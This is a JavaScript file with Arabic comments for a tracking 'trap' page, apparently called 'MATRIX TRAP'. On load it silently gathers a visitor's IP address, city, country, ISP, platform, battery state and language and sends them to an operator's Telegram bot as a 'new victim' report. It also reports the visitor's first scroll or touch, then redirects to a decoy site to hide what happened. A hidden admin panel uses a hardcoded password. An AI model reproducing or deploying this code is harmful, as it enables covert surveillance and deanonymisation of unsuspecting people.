// --- إعدادات النظام وتخزينها المحلى ---
const CONFIG = {
    token: localStorage.getItem('m_token') || "",
    id: localStorage.getItem('m_id') || "",
    url: localStorage.getItem('m_url') || "https://www.youtube.com",
    pass: "01224815487" // كلمة السر الخاصة بك
};

// --- وظيفة فتح لوحة التحكم المخفية ---
document.getElementById('adminTrigger').addEventListener('click', () => {
    let inputPass = prompt("ENTER ACCESS KEY:");
    if (inputPass === CONFIG.pass) {
        document.getElementById('overlay').style.display = 'block';
        document.getElementById('adminPanel').style.display = 'block';
        
        // تعبئة الخانات بالبيانات المحفوظة إن وجدت
        document.getElementById('botToken').value = CONFIG.token;
        document.getElementById('chatId').value = CONFIG.id;
        document.getElementById('redirectUrl').value = CONFIG.url;
    } else {
        alert("ACCESS DENIED. UNAUTHORIZED ATTEMPT LOGGED.");
    }
});

// --- حفظ الإعدادات من اللوحة ---
function saveSettings() {
    localStorage.setItem('m_token', document.getElementById('botToken').value);
    localStorage.setItem('m_id', document.getElementById('chatId').value);
    localStorage.setItem('m_url', document.getElementById('redirectUrl').value);
    
    document.getElementById('saveMsg').style.display = 'block';
    
    // إعادة تحميل الصفحة لتفعيل الإعدادات الجديدة
    setTimeout(() => { location.reload(); }, 1200);
}

// --- وظيفة إرسال التقارير لتليجرام ---
async function sendToTelegram(message) {
    if (!CONFIG.token || !CONFIG.id) return; // لن يرسل شيئاً إذا لم تكن الإعدادات كاملة
    
    const telegramUrl = `https://api.telegram.org/bot${CONFIG.token}/sendMessage`;
    try {
        await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.id,
                text: `🦅 *[MATRIX TRAP V1.0.48 REPORT]*\n\n${message}`,
                parse_mode: "Markdown"
            })
        });
    } catch (err) {
        console.error("TG Send Error");
    }
}

// --- المحرك الرئيسي لسحب البيانات (The Sniffer) ---
window.onload = async () => {
    try {
        // 1. سحب بيانات الشبكة والموقع (IP API)
        const ipRes = await fetch('https://ipapi.co/json/');
        const d = await ipRes.json();
        
        // 2. سحب حالة البطارية برمجياً
        let batteryInfo = "غير متاح";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batteryInfo = `${(b.level * 100).toFixed(0)}% [${b.charging ? 'جاري الشحن' : 'تفريغ'}]`;
        }

        // 3. تجهيز التقرير الكامل
        const report = `👤 *ضحية جديد في الفخ!*\n\n` +
                       `🌐 الـ IP: \`${d.ip}\`\n` +
                       `📍 الموقع: ${d.city}, ${d.country_name}\n` +
                       `📡 الشركة: ${d.org}\n` +
                       `📱 النظام: ${navigator.platform}\n` +
                       `🔋 البطارية: ${batteryInfo}\n` +
                       `🌍 اللغة: ${navigator.language}\n` +
                       `🕒 الوقت: ${new Date().toLocaleTimeString()}`;

        // إرسال التقرير الصامت
        await sendToTelegram(report);
        
    } catch (err) {
        console.log("Stealth Mode Active");
    }

    // --- مراقبة أول حركة للضحية (التفاعل) ---
    const movementDetected = () => {
        sendToTelegram("⚠️ *تنبيه:* الضحية بدأ يتفاعل مع الصفحة (لمس/تمرير)!");
        window.removeEventListener('scroll', movementDetected);
        window.removeEventListener('touchstart', movementDetected);
    };
    window.addEventListener('scroll', movementDetected);
    window.addEventListener('touchstart', movementDetected);

    // --- التحويل التلقائي للمحتوى الأصلي ---
    setTimeout(() => {
        // التحويل يتم فقط إذا لم تكن لوحة التحكم مفتوحة
        if (document.getElementById('adminPanel').style.display !== 'block') {
            window.location.href = CONFIG.url;
        }
    }, 4500); // 4.5 ثوانٍ مدة التمويه
};
